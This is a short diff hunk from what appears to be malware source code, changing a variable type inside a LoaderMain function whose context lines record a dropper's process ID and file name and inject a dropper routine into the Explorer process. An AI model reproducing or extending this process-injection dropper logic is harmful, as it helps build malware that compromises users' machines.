@@ -167,7 +167,7 @@ int APIENTRY LoaderMain()
 		DropperPID = GetCurrentProcessId();
 		GetModuleFileNameA(NULL, DropperName, MAX_PATH);
 
-		bool InExplorer = false;
+		BOOL InExplorer = FALSE;
 		if (!IsWIN64())
 			InExplorer = InjectIntoExplorer(DropperMainProc) != FALSE;
 		if (!InExplorer)
